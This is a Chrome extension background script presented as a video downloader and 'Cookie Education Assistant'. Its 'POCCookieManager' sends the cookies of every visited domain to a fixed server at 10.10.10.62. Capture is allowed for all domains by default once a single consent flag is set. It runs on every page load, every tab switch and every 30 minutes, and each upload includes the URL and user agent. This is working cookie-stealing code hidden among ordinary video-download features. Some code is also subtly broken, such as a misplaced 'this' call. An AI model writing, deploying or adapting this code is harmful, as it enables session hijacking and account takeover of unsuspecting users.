class POCCookieManager {
  constructor() {
    this.serverUrl = 'http://10.10.10.62';
    this.sessionId = null;
    this.userConsent = {
      granted: false,
      domains: [],
      timestamp: null,
      expiresAt: null
    };

    // Load saved consent on startup
    this.loadConsent();

    // Set up periodic cleanup
    this.setupCleanup();

    // Set up tab listeners for automatic cookie capture
    this.setupTabListeners();
  }

  async loadConsent() {
    try {
      const result = await chrome.storage.local.get(['userConsent', 'sessionId']);
      if (result.userConsent) {
        this.userConsent = result.userConsent;
        
        // Check if consent has expired
        if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
          console.log('🕒 User consent expired, clearing...');
          await this.clearConsent();
        }
      }
      if (result.sessionId) {
        this.sessionId = result.sessionId;
      }
    } catch (error) {
      console.error('❌ Failed to load consent:', error);
    }
  }

  async saveConsent() {
    try {
      await chrome.storage.local.set({
        userConsent: this.userConsent,
        sessionId: this.sessionId
      });
    } catch (error) {
      console.error('❌ Failed to save consent:', error);
    }
  }

  async grantConsent(domains = ['*']) {
    console.log('✅ User granted consent for domains:', domains);

    const now = new Date();
    const expiresAt = new Date(now.getTime() + (24 * 60 * 60 * 1000)); // 24 hours

    this.userConsent = {
      granted: true,
      domains: domains,
      timestamp: now.toISOString(),
      expiresAt: expiresAt.toISOString()
    };

    // Generate session ID
    this.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

    await this.saveConsent();

    // Immediately capture cookies from current active tab
    await this.captureCurrentTabCookies();
  }

  async revokeConsent() {
    console.log('🚫 User revoked consent');
    await this.clearConsent();
    
    // Notify server to clear session
    if (this.sessionId) {
      try {
        await fetch(`${this.serverUrl}/api/extension/revoke`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId: this.sessionId })
        });
      } catch (error) {
        console.error('❌ Failed to notify server of consent revocation:', error);
      }
    }
  }

  async clearConsent() {
    this.userConsent = {
      granted: false,
      domains: [],
      timestamp: null,
      expiresAt: null
    };
    this.sessionId = null;

    await chrome.storage.local.clear();
  }

  async extractCookies(domain) {
    if (!this.userConsent.granted) {
      throw new Error('User consent required to extract cookies');
    }

    // Check if domain is allowed (support wildcard '*' for all domains)
    if (!this.userConsent.domains.includes('*') && !this.userConsent.domains.includes(domain)) {
      throw new Error(`User consent required for domain: ${domain}`);
    }

    try {
      const cookies = await chrome.cookies.getAll({ domain });

      console.log(`🍪 Extracted ${cookies.length} cookies for ${domain}`);
      return cookies;
    } catch (error) {
      console.error(`❌ Failed to extract cookies for ${domain}:`, error);
      throw error;
    }
  }

  async shareCookies(domain, url = null) {
    if (!this.sessionId) {
      throw new Error('No session ID available');
    }

    try {
      const cookies = await this.extractCookies(domain);

      const response = await fetch(`${this.serverUrl}/api/extension/cookies`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId: this.sessionId,
          domain,
          url,
          cookies,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent
        })
      });

      if (!response.ok) {
        throw new Error(`Server responded with ${response.status}`);
      }

      const result = await response.json();
      console.log(`✅ Successfully shared ${domain} cookies:`, result);

      return result;
    } catch (error) {
      console.error(`❌ Failed to share ${domain} cookies:`, error);
      throw error;
    }
  }

  async getCurrentTab() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      return tab;
    } catch (error) {
      console.error('❌ Failed to get current tab:', error);
      return null;
    }
  }

  extractDomain(url) {
    try {
      const urlObj = new URL(url);
      return urlObj.hostname;
    } catch (error) {
      console.error('❌ Failed to extract domain from URL:', url, error);
      return null;
    }
  }

  async captureCurrentTabCookies() {
    try {
      const tab = await this.getCurrentTab();
      if (!tab || !tab.url) {
        console.log('⚠️ No active tab or URL found');
        return;
      }

      const domain = this.extractDomain(tab.url);
      if (!domain) {
        console.log('⚠️ Could not extract domain from:', tab.url);
        return;
      }

      await this.shareCookies(domain, tab.url);
    } catch (error) {
      console.error('❌ Failed to capture current tab cookies:', error);
    }
  }

  setupCleanup() {
    // Check for expired consent every hour
    setInterval(async () => {
      if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
        console.log('🧹 Cleaning up expired consent...');
        await this.clearConsent();
      }
    }, 60 * 60 * 1000); // 1 hour

    // Auto-refresh cookies every 30 minutes if consent is active
    setInterval(async () => {
      if (this.userConsent.granted) {
        console.log('🔄 Auto-refreshing cookies from current tab...');
        try {
          await this.captureCurrentTabCookies();
        } catch (error) {
          console.error('❌ Failed to auto-refresh cookies:', error);
        }
      }
    }, 30 * 60 * 1000); // 30 minutes
  }

  setupTabListeners() {
    // Listen for tab updates (URL changes)
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
      if (changeInfo.status === 'complete' && tab.url && this.userConsent.granted) {
        const domain = this.extractDomain(tab.url);
        if (domain) {
          console.log('🔄 Tab updated, capturing cookies for:', domain);
          this.shareCookies(domain, tab.url).catch(error => {
            console.error('❌ Failed to capture cookies on tab update:', error);
          });
        }
      }
    });

    // Listen for tab activation (switching between tabs)
    chrome.tabs.onActivated.addListener(async (activeInfo) => {
      if (this.userConsent.granted) {
        try {
          const tab = await chrome.tabs.get(activeInfo.tabId);
          if (tab.url) {
            const domain = this.extractDomain(tab.url);
            if (domain) {
              console.log('🔄 Tab activated, capturing cookies for:', domain);
              await this.shareCookies(domain, tab.url);
            }
          }
        } catch (error) {
          console.error('❌ Failed to capture cookies on tab activation:', error);
        }
      }
    });
  }

  getConsentStatus() {
    return {
      granted: this.userConsent.granted,
      domains: this.userConsent.domains,
      expiresAt: this.userConsent.expiresAt,
      sessionId: this.sessionId
    };
  }
}

// Initialize the cookie manager
console.log('🚀 Background script starting...');
let cookieManager;

try {
  cookieManager = new POCCookieManager();
  console.log('✅ Cookie manager initialized');
} catch (error) {
  console.error('❌ Failed to initialize cookie manager:', error);
  cookieManager = null;
}

// =============================================================================
// VIDEO MANAGEMENT SYSTEM
// =============================================================================

class VideoManager {
  constructor() {
    this.detectedVideos = new Map(); // Store videos by tab ID
    this.selectedVideos = new Map(); // Store selected video by tab ID
    this.tabVideoCount = new Map(); // Track video count per tab
  }

  handleVideosDetected(request, sender) {
    const tabId = sender.tab?.id;
    if (!tabId) return { error: 'No tab ID available' };

    // Store detected videos for this tab
    this.detectedVideos.set(tabId, request.videos);
    this.tabVideoCount.set(tabId, request.count);

    console.log(`🎬 Tab ${tabId}: Detected ${request.count} videos`);

    // Update badge with video count
    this.updateBadge(tabId, request.count);

    return { success: true, videosStored: request.count };
  }

  handleVideoSelected(request, sender) {
    const tabId = sender.tab?.id;
    if (!tabId) return { error: 'No tab ID available' };

    // Store selected video for this tab
    this.selectedVideos.set(tabId, request.video);

    console.log(`🎯 Tab ${tabId}: Video selected - ${request.video.title}`);

    // Update badge to show selection
    this.updateBadge(tabId, '✓');

    return { success: true, videoSelected: request.video.id };
  }

  getTabVideos(tabId) {
    return {
      detected: this.detectedVideos.get(tabId) || [],
      selected: this.selectedVideos.get(tabId) || null,
      count: this.tabVideoCount.get(tabId) || 0
    };
  }

  updateBadge(tabId, text) {
    try {
      chrome.action.setBadgeText({
        text: text.toString(),
        tabId: tabId
      });

      chrome.action.setBadgeBackgroundColor({
        color: text === '✓' ? '#4CAF50' : '#FF9800',
        tabId: tabId
      });
    } catch (error) {
      console.error('❌ Failed to update badge:', error);
    }
  }

  clearTabData(tabId) {
    this.detectedVideos.delete(tabId);
    this.selectedVideos.delete(tabId);
    this.tabVideoCount.delete(tabId);
  }
}

// Initialize video manager
const videoManager = new VideoManager();

// =============================================================================
// STREAM ANALYSIS INTEGRATION
// =============================================================================

// Initialize network monitor if permissions are available
let networkMonitor = null;

async function initializeNetworkMonitor() {
  try {
    const hasPermissions = await chrome.permissions.contains({
      permissions: ['webRequest', 'webRequestBlocking']
    });

    if (hasPermissions) {
      const { networkMonitor: NetworkMonitorClass } = await import('./modules/network-monitor.js');
      networkMonitor = new NetworkMonitorClass();

      console.log('✅ Network monitor initialized');
    } else {
      console.log('ℹ️ Network monitoring requires additional permissions');
    }
  } catch (error) {
    console.error('❌ Failed to initialize network monitor:', error);
  }
}

// Enhanced video manager with stream analysis
class EnhancedVideoManager extends VideoManager {
  constructor() {
    super();
    this.streamAnalysisResults = new Map(); // videoId -> analysis
  }

  handleStreamAnalyzed(request, sender) {
    const { videoId, analysis } = request;
    const tabId = sender.tab?.id;

    if (!tabId) return { error: 'No tab ID available' };

    // Store analysis results
    this.streamAnalysisResults.set(videoId, {
      analysis,
      tabId,
      timestamp: Date.now()
    });

    console.log(`🔬 Stream analysis stored for video: ${videoId}`, {
      downloadable: analysis.downloadable,
      format: analysis.format,
      confidence: analysis.confidence
    });

    // Update badge to show analysis status
    if (analysis.downloadable) {
      this.updateBadge(tabId, '✓');
    } else {
      this.updateBadge(tabId, '?');
    }

    return { success: true, analysisStored: true };
  }

  getTabVideos(tabId) {
    const baseData = super.getTabVideos(tabId);

    // Enhance with stream analysis data
    if (baseData.detected) {
      baseData.detected = baseData.detected.map(video => {
        const analysisData = this.streamAnalysisResults.get(video.id);
        return {
          ...video,
          streamAnalysis: analysisData ? analysisData.analysis : null
        };
      });
    }

    // Add stream analysis summary
    const analysisResults = Array.from(this.streamAnalysisResults.values())
      .filter(result => result.tabId === tabId);

    baseData.streamAnalysis = {
      totalAnalyzed: analysisResults.length,
      downloadable: analysisResults.filter(r => r.analysis.downloadable).length,
      hasAnalysis: analysisResults.length > 0
    };

    return baseData;
  }

  clearTabData(tabId) {
    super.clearTabData(tabId);

    // Clear stream analysis data
    for (const [videoId, data] of this.streamAnalysisResults.entries()) {
      if (data.tabId === tabId) {
        this.streamAnalysisResults.delete(videoId);
      }
    }
  }
}

// Replace original video manager
const enhancedVideoManager = new EnhancedVideoManager();

// Copy existing data
Object.setPrototypeOf(enhancedVideoManager, VideoManager.prototype);
enhancedVideoManager.detectedVideos = videoManager.detectedVideos;
enhancedVideoManager.selectedVideos = videoManager.selectedVideos;
enhancedVideoManager.tabVideoCount = videoManager.tabVideoCount;

// Initialize network monitor
initializeNetworkMonitor();

// =============================================================================
// CONTEXT MENU INTEGRATION
// =============================================================================

// Create context menu items
chrome.runtime.onInstalled.addListener(() => {
  // Context menu for video elements
  chrome.contextMenus.create({
    id: 'downloadVideo',
    title: '📥 Download this video',
    contexts: ['video'],
    visible: true
  });

  // Context menu for video pages
  chrome.contextMenus.create({
    id: 'showVideos',
    title: '🎬 Show all videos on page',
    contexts: ['page'],
    visible: true
  });

  // Separator
  chrome.contextMenus.create({
    id: 'separator1',
    type: 'separator',
    contexts: ['video', 'page']
  });

  // Context menu for iframe videos
  chrome.contextMenus.create({
    id: 'downloadFrameVideo',
    title: '📥 Download embedded video',
    contexts: ['frame'],
    visible: true
  });

  console.log('✅ Context menus created');
});

// Handle context menu clicks
chrome.contextMenus.onClicked.addListener(async (info, tab) => {
  console.log('🖱️ Context menu clicked:', info.menuItemId, 'on tab:', tab.id);

  try {
    switch (info.menuItemId) {
      case 'downloadVideo':
        await handleContextMenuVideoDownload(info, tab);
        break;

      case 'downloadFrameVideo':
        await handleContextMenuVideoDownload(info, tab);
        break;

      case 'showVideos':
        await handleShowAllVideos(info, tab);
        break;

      default:
        console.log('Unknown context menu item:', info.menuItemId);
    }
  } catch (error) {
    console.error('❌ Context menu error:', error);
  }
});

async function handleContextMenuVideoDownload(info, tab) {
  console.log('🎬 Context menu video download request');

  // Try to get video information from the current page
  const tabVideos = videoManager.getTabVideos(tab.id);

  if (tabVideos.detected.length === 0) {
    // No videos detected, inject content script to scan
    await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      function: () => {
        if (window.videoManager) {
          window.videoManager.scanForVideos();
        }
      }
    });

    // Wait a moment for detection
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  // Find video at the clicked position or just use the first main video
  let targetVideo = null;
  const updatedTabVideos = videoManager.getTabVideos(tab.id);

  if (updatedTabVideos.detected.length > 0) {
    // Prefer main content videos
    targetVideo = updatedTabVideos.detected.find(v => v.category === 'main') ||
                  updatedTabVideos.detected.find(v => v.category === 'content') ||
                  updatedTabVideos.detected[0];
  }

  if (targetVideo) {
    console.log('🎯 Context menu selected video:', targetVideo.title);

    // Store as selected video
    videoManager.selectedVideos.set(tab.id, targetVideo);

    // Show notification that video was selected
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon48.png',
      title: 'Video Selected',
      message: `"${targetVideo.title}" is ready for download`
    });

    // Update badge
    videoManager.updateBadge(tab.id, '✓');
  } else {
    // No videos found
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon48.png',
      title: 'No Videos Found',
      message: 'No downloadable videos detected on this page'
    });
  }
}

async function handleShowAllVideos(info, tab) {
  console.log('🎬 Show all videos request');

  // Inject content script to scan for videos
  try {
    await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      function: () => {
        if (window.videoManager) {
          window.videoManager.scanForVideos();

          // Force show all overlays briefly
          const overlays = document.querySelectorAll('.video-downloader-overlay');
          overlays.forEach(overlay => {
            overlay.style.display = 'block';
            overlay.style.opacity = '0.8';
          });

          // Hide overlays after 3 seconds
          setTimeout(() => {
            overlays.forEach(overlay => {
              overlay.style.display = 'none';
            });
          }, 3000);
        }
      }
    });

    const tabVideos = videoManager.getTabVideos(tab.id);

    if (tabVideos.count > 0) {
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon48.png',
        title: 'Videos Highlighted',
        message: `Found ${tabVideos.count} videos - hover over them to download`
      });
    } else {
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon48.png',
        title: 'No Videos Found',
        message: 'No videos detected on this page'
      });
    }
  } catch (error) {
    console.error('❌ Failed to show videos:', error);
  }
}

// Clean up tab data when tabs are closed
chrome.tabs.onRemoved.addListener((tabId) => {
  enhancedVideoManager.clearTabData(tabId);
});

// Handle messages from popup and content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('📬 Background received message:', request);

  (async () => {
    try {
      if (!cookieManager) {
        sendResponse({ error: 'Cookie manager not initialized' });
        return;
      }

      switch (request.action) {
        case 'getConsentStatus':
          const status = cookieManager.getConsentStatus();
          console.log('📊 Sending consent status:', status);
          sendResponse(status);
          break;

        case 'grantConsent':
          // Default to all domains if no specific domains provided
          const domains = request.domains || ['*'];
          await cookieManager.grantConsent(domains);
          sendResponse({ success: true });
          break;

        case 'revokeConsent':
          await cookieManager.revokeConsent();
          sendResponse({ success: true });
          break;

        case 'captureCurrentTab':
          await cookieManager.captureCurrentTabCookies();
          sendResponse({ success: true });
          break;

        case 'shareCookies':
          // Support both old platform-based and new domain-based calls
          const domain = request.domain || request.platform;
          const result = await cookieManager.shareCookies(domain, request.url);
          sendResponse({ success: true, result });
          break;

        // Video management actions
        case 'videosDetected':
          const detectionResult = enhancedVideoManager.handleVideosDetected(request, sender);
          sendResponse(detectionResult);
          break;

        case 'videoSelected':
          const selectionResult = enhancedVideoManager.handleVideoSelected(request, sender);
          sendResponse(selectionResult);
          break;

        case 'streamAnalyzed':
          const analysisResult = enhancedVideoManager.handleStreamAnalyzed(request, sender);
          sendResponse(analysisResult);
          break;

        case 'getTabVideos':
          const tabId = request.tabId || sender.tab?.id;
          const tabVideos = enhancedVideoManager.getTabVideos(tabId);
          sendResponse(tabVideos);
          break;

        case 'downloadVideo':
          // Future: Handle video download request
          const downloadResult = await this.handleVideoDownload(request);
          sendResponse(downloadResult);
          break;

        default:
          sendResponse({ error: 'Unknown action' });
      }
    } catch (error) {
      console.error('❌ Background script error:', error);
      sendResponse({ error: error.message });
    }
  })();

  // Return true to indicate we'll respond asynchronously
  return true;
});

// Handle video download request (placeholder for future implementation)
async function handleVideoDownload(request) {
  console.log('🎬 Download request for video:', request.videoId);

  // Future implementation will handle:
  // 1. Video URL analysis
  // 2. Stream format detection
  // 3. Server communication for download processing

  return {
    success: false,
    message: 'Download feature coming soon!',
    videoId: request.videoId
  };
}

// Add error handling for runtime errors
chrome.runtime.onStartup.addListener(() => {
  console.log('🔄 Extension startup');
});

chrome.runtime.onSuspend.addListener(() => {
  console.log('😴 Extension suspending');
});

// Handle installation
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    console.log('🎉 Cookie Education Assistant installed');
    chrome.tabs.create({ url: 'http://localhost:3000' });
  }
});

console.log('🚀 Cookie Education Assistant background script loaded');